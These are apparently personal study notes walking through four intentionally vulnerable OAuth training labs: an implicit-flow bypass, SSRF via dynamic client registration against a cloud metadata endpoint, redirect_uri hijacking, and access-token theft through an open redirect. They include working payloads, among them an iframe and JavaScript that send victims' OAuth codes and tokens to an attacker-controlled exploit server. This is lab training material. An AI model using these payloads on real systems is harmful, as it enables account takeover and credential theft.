
Stages 1 + 2

---

#### 1/2.1. Lab: Authentication bypass via OAuth implicit flow ⭕️
This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.

To solve the lab, log in to Carlos's account. His email address is `carlos@carlos-montoya.net`.

You can log in with your own social media account using the following credentials: `wiener:peter`.

1. Login > click my account > notice it says "We are now redirecting you to social media..." > login with social media creds: `wiener:peter`.
2. Observe HTTP History and see `GET /auth?client-id=...` and `POST /authenticate`. `POST /authenticate` has an email field. Change it to carlos's email and got a 302.
	1. ![[OAuth Authentication-20260212135151611.png]]
3. Right click > request in browser > in original session > paste URL in browser > my account and solved. We are now in carlos's account.
	1. ![[OAuth Authentication-20260212135442750.png]]

How to ID:
- auth blog > every field > my account: we are now redirecting to social media > social media creds: `wiener:peter` > `GET /auth?client-id=...` > `POST /authenticate` > no features (change email, address, password, etc.) > your email: wiener@hotdog.com

---

#### 1/2.2. Lab: SSRF via OpenID dynamic client registration ⭕️
This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.

To solve the lab, craft an SSRF attack to access `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` and steal the secret access key for the OAuth provider's cloud environment.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login > social media creds: `wiener:peter` > notice there are no features.
2. Observe HTTP History to see `GET /auth?client-id=...`. Grab one `GET` request from OAuth > go to `/.well-known/openid-configuration` and got a 200 OK.
	1. Search for `/reg`
	2. ![[OAuth Authentication-20260212141053918.png]]
3. Create a `POST` request with the payload below and a 201 Created and also notice a new client_id.
	1. ![[OAuth Authentication-20260212140525077.png]]
```
POST /reg HTTP/2
Host: oauth-0a7900340419a96780f5ab30022300fa.oauth-server.net
Content-Type: application/json
Content-Length: 160

{
    "redirect_uris" : [
        "https://example.com"
    ]
```

4. Add `logo_uri` and your burp collaborator domain > grab the new client_id > replace it in the `GET /client/{CLIENT_ID}/logo` request and got a 200 OK. Poll burp collaborator and got a HTTP hit back.
	1. ![[OAuth Authentication-20260212140809500.png]]
	2. ![[OAuth Authentication-20260212140829223.png]]
	3. ![[OAuth Authentication-20260212140847496.png]]
5. Replace your burp collaborator domain with `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` > grab this new client_id > replace that in the `GET /client...` request > submit the SecretAccessKey: `RI2xCHi6401F2daBsF1ZvWMSaSQRSFeTZBCTn3rn` to solve.
	1. ![[OAuth Authentication-20260212140938310.png]]
	2. ![[OAuth Authentication-20260212141011203.png]]

How to ID:
- auth blog > every field > my account: we are now redirecting to social media > social media creds: `wiener:peter` >`GET /auth?client-id=...` > NO `POST /authenticate` > no features (change email, address, password, etc.) > your email: wiener@hotdog.com > https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration == 200 OK > 

---

#### 1/2.4. Lab: OAuth account hijacking via redirect_uri ⭕️
This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user `carlos`.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: `wiener:peter`.

1. Login > Use the social media login feature > log out > log in > now you login automatically without needing to input credentials again.
2. Observe the `GET /social-login` request > search for `redirect_uri` > towards the bottom notice a `<meta>` tag containing a redirect_uri and an URL.
	1. ![[Extra Labs-20260127214844665.png]]
3. Site map > `oauth-...` > `GET /auth?client_id..` > look at the response > notice there is a redirect back to the burp app with a `code=` and this is essentially like a one-time-use password and if we get it, we can use it to login as the victim.
	1. ![[Extra Labs-20260127215423579.png]]
4. Send `GET /auth` to Repeater > change the `redirect_uri` value to something like `HACKER.com` > Send > notice **we are being redirected to `HACKER.com`**. The code can be exfiltrated to an attacker-controlled server.
	1. ![[Extra Labs-20260127215727812.png]]
5. Getting the victim's OAuth code:
	1. Paste the payload below in exploit server and deliver exploit to victim.
	2. `YOUR-LAB-OAUTH-SERVER-ID` ![[Extra Labs-20260127220439219.png]]
	3. `YOUR-LAB-CLIENT-ID` ![[Extra Labs-20260127220507562.png]]
	4. `YOUR-EXPLOIT-SERVER-ID` ![[Extra Labs-20260127220534848.png]]
	5. ![[Extra Labs-20260127220712658.png]]
	6. Click on Access Log and notice we got the victim's code
		1. ![[Extra Labs-20260127220807362.png]]
6. **IMPORTANT: log out **
7. Authenticating as the victim:
	1. Send the `GET /oauth-callback` request to Repeater > replace the `code=` > **IMPORTANT: DON'T SEND THE REQUEST** (one time code so do it in the browser).
		1. ![[Extra Labs-20260127221100172.png]]
	2. Notice we have access to the Admin panel. Confirming that we privesc'd! Delete carlos and solve.
		1. ![[Extra Labs-20260127221303756.png]]
```
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

>[!tip] How to Identify this Vulnerability
>1. OAuth -- log in automatically after setup
>2. `redirect_uri` in `GET /social-login` response
>3. `GET /auth` allowed arbitrary domain in the `redirect_uri` query parameter

---
#### 1/2.5. Lab: Stealing OAuth access tokens via an open redirect ⭕️
This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.
>Note: You cannot access the admin's API key by simply logging in to their account on the client application.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: `wiener:peter`.

1. Login > social media creds: `wiener:peter`. Notice "Your API Key is: hidden" and `GET /me`. Find `GET /auth?client_id` and add `/../post?postId=1` after callback will get us 302 Found meaning it is allowed.
	1. Request in browser and it should redirect you to `postId=1`. Might have to sign in with social media again. *To not have to sign in again, intercept the `GET /auth` request, add the path traversal code, then forward.*
	2. ![[OAuth Authentication-20260212142907184.png]]
2. Change the domain to `example.com` == 400 Bad Request.
	1. ![[OAuth Authentication-20260212142658488.png]]
3. Target > Site map > engagement tools > Search: `/post/next?path=` and notice that blog posts has a "Next post" button.
	1. **Burp scan found Open redirection issue too**.
	2. ![[OAuth Authentication-20260212143558762.png]]
4. Use the payload below and paste it in the browser and you should see what's stored in your exploit server which is Hello, world. *Replace the following: `YOUR-OAUTH-SERVER-ID, YOUR-CLIENT-ID, YOUR-LAB-ID, YOUR-EXPLOIT-SERVER-ID`*.
	1. ![[OAuth Authentication-20260212143914458.png]]
```
https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
```
5. Notice an `access-token` in the URL as a fragment (because of the hashtag #?)
	1. ![[OAuth Authentication-20260212144415169.png]]
6. Store the following payload in your exploit server > navigate to the URL again from Step 4 > check the access log > and you should see *your* `access_token`.
```
<script> window.location = '/?'+document.location.hash.substr(1) </script>
```
![[OAuth Authentication-20260212144630969.png]]

7. Store the payload below in your exploit server. Remember to *replace the following: `YOUR-OAUTH-SERVER-ID, YOUR-CLIENT-ID, YOUR-LAB-ID, YOUR-EXPLOIT-SERVER-ID`* before storing. Click view exploit and you should see your access_token.
```
<script> if (!document.location.hash) { window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' } else { window.location = '/?'+document.location.hash.substr(1) } </script>
```

8. Deliver exploit to victim > access log > and notice the victim's access_token! `access_token=p_tAsLyUFAHoZ2-XI3DZLcnkN2VXLGK3Hs04NwhHaS7`
	1. ![[OAuth Authentication-20260212145004335.png]]

9. Grab the `GET /me` request > replace the access_token value we got to `Authorization: Bearer` > Send > submit the apikey and solve.
	1. ![[OAuth Authentication-20260212145156117.png]]

How to ID:
- auth blog > every field > my account: we are now redirecting to social media > social media creds: `wiener:peter` > your email: wiener@hotdog.com > Your API Key is: hidden > `GET /me` > `GET /auth?client-id=...` > `POST /authenticate` > no features > "Next post" button on blog posts or /post/next?path= in source > 

Scan found Open redirection.
![[OAuth Authentication-20260212143455566.png]]

---
